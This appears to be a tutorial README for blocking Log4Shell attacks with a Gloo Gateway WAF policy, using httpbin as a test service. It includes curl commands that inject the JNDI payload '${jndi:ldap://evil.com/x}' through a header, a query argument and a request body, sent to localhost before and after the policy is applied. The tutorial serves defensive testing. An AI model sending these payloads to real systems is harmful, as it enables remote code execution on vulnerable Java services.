# Block Log4Shell attacks with Gloo Gateway

https://www.solo.io/blog/block-log4shell-attacks-with-gloo-gateway/

## Deploy httpbin

```sh
kubectl create namespace httpbin --context gloo
kubectl --context gloo label namespace httpbin istio-injection=enabled

kubectl apply -f log4shell/httpbin.yaml -n httpbin --context gloo
```

## Gloo Mesh Config

```sh
kubectl apply -f log4shell/workspace.yaml --context gloo
kubectl apply -f log4shell/virtual-gateway.yaml --context gloo
kubectl apply -f log4shell/route-table.yaml --context gloo
```

## Test Bad Call

This call has a potentially malicious remote-access header passed in through the `User-Agent` header. If the responding service was a Java service using an unpatched version of Log4j, then we could be in real trouble. The call is accepted without intervention.

```sh
curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything -i
```

## Apply Policy

```sh
kubectl apply -f log4shell/waf-policy.yaml --context gloo
```

## Re-test Bad Calls

Now we have a WAF policy in place that blocks potentially malicious headers, request argument, and request payloads. Note that all of these "attacks" are now rejected by Gloo Gateway before they reach the upstream service.

```sh
# Request Header Attacks
curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything -i
# Request Argument Attacks
curl -X GET localhost:8080/anything\?arg-1=\$\\{jndi:ldap://evil.com/x\\} -i
# Request Payload Attacks
curl -X POST -d "arg-1=\${jndi:ldap://evil.com/x}" localhost:8080/anything -i
```
